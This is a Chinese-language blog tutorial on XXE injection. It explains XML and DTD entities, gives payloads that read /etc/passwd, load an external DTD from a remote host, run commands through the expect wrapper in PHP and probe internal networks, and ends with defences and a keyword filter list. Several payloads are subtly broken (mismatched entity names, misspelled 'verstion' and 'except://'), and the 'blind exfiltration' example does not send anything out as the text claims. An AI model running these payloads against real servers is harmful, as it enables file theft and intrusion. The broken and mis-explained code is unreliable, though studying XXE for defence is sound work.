## 0x01 XML基础

在聊XXE之前，先说说相关的XML知识吧。

#### 定义

XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

#### 文档结构

XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。



```xml
<!--XML声明-->
<?xml version="1.0"?> 
<!--文档类型定义-->
<!DOCTYPE note [  <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
]]]>
<!--文档元素-->
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>
```

#### DTD

XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。
 内部声明DTD:



```xml
<!DOCTYPE 根元素 [元素声明]>
```

引用外部DTD:



```xml
<!DOCTYPE 根元素 SYSTEM "文件名">
```

DTD中的一些重要的关键字：

- DOCTYPE（DTD的声明）
- ENTITY（实体的声明）
- SYSTEM、PUBLIC（外部资源申请）

#### 实体类别介绍

实体主要分为一下四类

- 内置实体 (Built-in entities)
- 字符实体 (Character entities)
- 通用实体 (General entities)
- 参数实体 (Parameter entities)

**参数实体**用%实体名称申明，引用时也用%实体名称;
 **其余实体**直接用实体名称申明，引用时用&实体名称。
 **参数实体**只能在DTD中申明，DTD中引用；
 **其余实体**只能在DTD中申明，可在xml文档中引用。

举例：
 内部实体



```bash
<!ENTITY 实体名称 "实体内容">
```

外部实体



```bash
<!ENTITY 实体名称 SYSTEM "URI">
```

参数实体



```bash
<!ENTITY % 实体名称 "实体内容">
或者
<!ENTITY % 实体名称 "URI">
```

注意：**参数实体**是在DTD中被引用的，而**其余实体**是在xml文档中被引用的。

#### 外部实体

默认协议



![img](https:////upload-images.jianshu.io/upload_images/7119304-05174f617ea4b47a.png?imageMogr2/auto-orient/strip|imageView2/2/w/585/format/webp)

PHP扩展协议



![img](https:////upload-images.jianshu.io/upload_images/7119304-a96949027215f21d.png?imageMogr2/auto-orient/strip|imageView2/2/w/497/format/webp)

举例：



```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a [<!ENTITY passwd "file:///etc/passwd">]>
<foo>
        <value>&passwd;</value>
</foo>
```

## 0x02 XXE漏洞

XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。

#### 举例

1. 恶意引入外部实体(1)



```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a [<!ENTITY passwd SYSTEM "file:///etc/passwd">]>
<a>
        <value>&passwd;</value>
</a>
```

1. 恶意引入外部实体(2)



```jsx
**XML内容**
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
                <!ENTITY % f SYSTEM "http://www.m03.com/evil.dtd">
                %d;
]>
<aaa>&b;</aaa>
```

**DTD文件内容**



```bash
<!ENTITY b SYSTEM "file:///etc/passwd">
```

1. 恶意引入外部实体(3)

**XML文件内容**



```xml
<?xml verstion="1.0" encoding="utf-8"?>
<!DOCTYPE a[
                <!ENTITY f SYSTEM "http://www.m03.com/evil.dtd">
]>
<a>&b;</a>
```

**DTD文件内容**



```bash
<!ENTITY b SYSTEM "file:///etc/passwd">
```

#### XXE的危害

1. 读取任意文件
    \- 有回显
    XML.php



```xml
<?php 
$xml = <<<EOF
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
```

访问XML.php可以读取etc/passwd文件内容



```undefined
    - 无回显
```

当页面没有回显的话，可以将文件内容发送到远程服务器，然后读取。



```xml
<?xml verstion="1.0" encoding="utf-8"?>
<!DOCTYPE a[
                <!ENTITY % f SYSTEM "http://www.m03.com/evil.dtd">
                 %f;
]>
<a>&b;</a>
$data = simplexml_load_string($xml);
print_r($data);
```

远程服务器的evil.dtd文件内容



```bash
<!ENTITY b SYSTEM "file:///etc/passwd">
```

1. 命令执行

php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。



```xml
<?php 
$xml = <<<EOF
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "except://ls">
]>
<x>&f;</x>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
```

1. 内网探测/SSRF

由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。

## 0x03 XXE漏洞修复与防御

1. 使用开发语言提供的禁用外部实体的方法
    PHP



```bash
libxml_disable_entity_loader(true);
```

JAVA



```bash
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
```

Python



```python
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

1. 过滤用户提交的XML数据
    过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC。

## 0x04 遗留问题(已解决)

以上测试在php5.4一下包括5.4是成功的，php5.5及以上是不成功的。可能的原因是5.5以上版本后，simplexml_load_string()、DOMDocument::loadxml()等不解析外部实体导致都不到文件还是因为libxml2版本的问题，还是高版本的php本身默认不解析外部实体呢，还是其他神恶魔原因呢？如果是因为php本身问题，那么XXE的利用范围也太过小了吧，应该不是这样的。。但是讲道理网上的资料太老了吧，估计也是参考别人的自己没有试验吧，等有空再做实验看看是什么问题。
 （2017.9.20更新）
 今天在弄phith0n的vulhub的时候，无意间看到php-xxe的项目，得到了我想要的结果。XXE的利用跟php版本没有关系，而是xmllib的版本问题，xmllib2.9.0以后，是默认不解析外部实体的。

## 0x05 参考文献

[https://security.tencent.com/index.php/blog/msg/69](https://link.jianshu.com?t=https://security.tencent.com/index.php/blog/msg/69)
 [http://php.yjsweb.cn/php/68075544811183197241.html](https://link.jianshu.com?t=http://php.yjsweb.cn/php/68075544811183197241.html)
 [https://thief.one/2017/06/20/1/](https://link.jianshu.com?t=https://thief.one/2017/06/20/1/)



作者：Pino_HD
链接：https://www.jianshu.com/p/7325b2ef8fc9